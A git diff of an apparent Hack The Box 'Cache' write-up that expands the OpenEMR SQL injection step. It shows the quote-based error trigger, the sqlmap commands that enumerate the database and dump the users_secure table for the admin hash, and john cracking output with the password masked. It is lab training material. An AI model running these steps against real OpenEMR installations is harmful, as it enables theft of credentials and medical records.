@@ -153,9 +153,9 @@ Then, I was able to access OpenEMR login page via `http:/hms.htb`.
 
 By Google searching about OpenEMR, I was able to discover some good amount of known vulnerabilities associated with this product. 
 
-* <b>Vulnerability Disclosure Report</b> - https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf
+* <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">OpenEMR Vulnerability Disclosure Report</a>
 
-* <b>OpenEMR Simulated Attack</b> - https://www.youtube.com/watch?v=DJSQ8Pk_7hc
+* <a href="https://www.youtube.com/watch?v=DJSQ8Pk_7hc">OpenEMR Simulated Attack Video</a>
 
 In a nutshell, the product was written in PHP and heavily vulnerable to multiple SQLi attacks because the codes were not sanitizing the user input properly, and most of the SQL syntax were not written in parameterized queries.
 
@@ -175,16 +175,50 @@ By adding `?eid='` at the end of the above page, we can cause the SQL error.
 
 ![image](/assets/img/post/htb/cache/09_sql-error.png)
 
+Then, capture the above `GET` request with Burp in order to feed that `GET` request to the `sqlmap`.
 
+![image](/assets/img/post/htb/cache/10_get.png)
 
+<b>sqlmap</b>
+
+Save the `GET` into a file such as `openemr.req` and let's feed that into the `sqlmap` to see if we can retrieve what kind of databases from the application.
+
+```console
+$ sqlmap -r openemr.req --threads=10 --dbs
+```
+This found two (2) databases: 1) information_schema; 2) openemr
+
+![image](/assets/img/post/htb/cache/11_db.png)
+
+Then, we can query for tables for the database `openemr` and by dumping `users_secure` table, we can obtain the password hash for the `openemr_admin` user. 
+
+```console
+$ sqlmap -r openemr.req --threads=10 -D openemr --tables
+
+$ sqlmap -r openemr.req --threads=10 -D openemr -T users_secure --dump
+```
+
+![image](/assets/img/post/htb/cache/12_admin.png)
+
+Upon obatin the hash, we can use `john` to crack it. It turned out to be `xxxxxx` in cleartext.
+
+```console
+$ john pass.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 32 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+xxxxxx           (?)
+1g 0:00:00:00 DONE 2/3 (2020-10-25 22:26) 3.571g/s 4114p/s 4114c/s 4114C/s water..88888888
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
 
 ```
-sqlmap -r openemr.req --threads=10 --dbs
 
-sqlmap -r openemr.req --threads=10 -D openemr --tables
-
-sqlmap -r openemr.req --threads=10 -D openemr -T users_secure --dump
-```
 
 
 ## Privilege Escalation
